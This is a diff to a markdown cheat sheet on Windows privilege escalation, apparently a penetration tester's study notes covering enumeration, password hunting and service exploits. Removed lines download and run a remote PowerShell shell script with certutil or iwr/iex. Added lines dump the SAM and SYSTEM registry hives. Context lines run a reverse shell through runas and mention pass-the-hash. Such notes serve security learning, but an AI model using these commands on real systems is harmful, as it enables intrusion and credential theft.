@@ -21,23 +21,9 @@ No nonsense - straight to business
 Weak Registry
 {% endembed %}
 
-Watch out for ADS (Alternate data streams) - good way to hide data (`dir /R` lists it out for you)&#x20;
-
 Host file -`C:\Windows\System32\drivers\etc\hosts`
 
 ## Commands
-
-```
-findstr /B /C "string" - grep basically
-certutil -urlcache -f http://$IP/$PATH_TO_FILE - wget basically
-searchsploit <keyword> - search for exploits here instead of google first lmao
-searchsploit -m $ID - gets exploit code/script from db
-icacls - ACL to files/directories
-where /R c:\windows bash.exe
-
-iwr -Uri "[file_url]" -OutFile "$env:TEMP\[file]"; 
-iex "$env:TEMP\shell.ps1"
-```
 
 ### Basic Info gathering
 
@@ -45,9 +31,17 @@ iex "$env:TEMP\shell.ps1"
 systeminfo - (look for latest hotfixes patched)
 wmic qfe - check patch history (wmi - windows management instrumentation command line quick fix engineering)
 wmic logicaldisk get caption,description,providername
+
+findstr /B /C "string" - grep basically
+icacls - ACL to files/directories
+where /R c:\windows bash.exe
+
+dir /R [Watch out for ADS (Alternate data streams) - good way to hide data]
+dir  /A:H (ls -la of cmd.exe)
+ls -force (ls -la of powershell)
 ```
 
-#### User Enumeration
+### User Enumeration
 
 ```
 whoami /priv /groups
@@ -56,7 +50,7 @@ net user $username - lists all relavant info of that user
 net localgroup $groupname
 ```
 
-#### Network Enumeration
+### Network Enumeration
 
 ```
 ipconfig
@@ -64,13 +58,13 @@ arp -a
 netstat -ano 
 ```
 
-#### Password Hunting (Can automate)
+### Password Hunting (Can automate)
 
 ```
 findstr "/si password *.txt (look for string "password" in any txt file) 
 ```
 
-#### AV Enumeration
+### AV Enumeration
 
 ```
 sc query windefend
@@ -114,8 +108,13 @@ Password exploits
     runas /savecred /user:username C:\PrivEsc\reverse.exe
     ```
 * Registry - The registry can be searched for keys and values that contain the word "password":
-* SAM (Security Account Manager)\
-  SAM and SYSTEM can be found at `Windows/System32/config`
+*   SAM (Security Account Manager)\
+    SAM and SYSTEM can be found at `Windows/System32/config`
+
+    ```
+    reg save hklm\sam c:\Temp\sam
+    reg save hklm\system c:\Temp\system
+    ```
 * Pass the hash - if `psexec` don't work, `smbexec.py` (half shell) or `wmiexec`
 
 ## Service Exploits
